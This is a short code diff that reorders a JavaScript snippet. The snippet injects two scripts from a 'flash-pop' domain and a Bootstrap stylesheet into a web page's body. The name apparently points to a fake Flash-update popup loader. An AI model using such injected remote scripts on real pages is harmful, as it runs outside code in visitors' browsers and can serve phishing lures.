@@ -1,11 +1,11 @@
-s1.src = 'https://flash-pop.se7ensec.cn/layer/jquery.min.js';
-s2.src = 'https://flash-pop.se7ensec.cn/layer/layer.js';
-s3.src = 'https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css';
 s1 = document.createElement('script');
+s1.src = 'https://flash-pop.se7ensec.cn/layer/jquery.min.js';
 document.body.appendChild(s1);
 s2 = document.createElement('script');
+s2.src = 'https://flash-pop.se7ensec.cn/layer/layer.js';
 document.body.appendChild(s2);
 s3 = document.createElement('link');
+s3.href = 'https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css';
 document.body.appendChild(s3);
 
         window.onload = () => {
